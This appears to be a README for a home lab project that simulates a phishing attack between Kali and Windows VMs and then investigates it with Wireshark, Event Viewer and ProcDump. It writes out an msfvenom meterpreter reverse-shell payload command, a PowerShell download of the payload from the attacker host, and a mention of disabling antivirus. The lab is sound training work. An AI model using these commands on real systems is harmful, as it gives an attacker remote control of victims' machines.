# Phishing-Incident-Response-Project

In this project, I wanted to simulate a phishing payload in a windows environment and capture the activity to perform an incident response investigation with tools like Wireshark and Windows Event Viewer.

# Lab Environment
| Machine    | OS           | IP Address     | Purpose                            |
| ---------- | ------------ | -------------- | ---------------------------------- |
| Kali Linux | Debian-based | 192.168.56.101 | Attacker machine (payload hosting) |
| Windows 10 | Version 22H2 | 192.168.56.102 | Target machine                     |

Virtualization: Oracle VirtualBox
Networking: Host-Only Adapter
Tools: Metasploit, Wireshark, Event Viewer, Sysinternals ProcDump, Volatility 3

# Red Team - Phishing Attack
I started with working off of my Kali Linux VM and wrote a Phishing Payload with Metasploit:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe > phishing_payload.exe

I then hosted the payload via Apache, then downloaded the Payload on my Windows VM using:
Invoke-WebRequest -Uri http://192.168.56.101/phishing_payload.exe -OutFile phishing_payload.exe

I had to disable real-time protection in my Windows VM and use the powershell command to get the payload due to Windows's native malware protections. After that, I executed the payload and proceeded to collect information from my Kali Linux VM side.

# Blue Team - Incident Response
Using Wireshark, I was able to capture the traffic between my two VMs the second the payload was executed on my Windows VM. I was also able to go into Windows Defender Event Viewer and see alerts where malware was detected and actions were taken to remove the affected software. Next, I learned how to use ProcDump to capture the memory from the payload usingL:
procdump -ma 3234 phishing_payload_dump.dmp
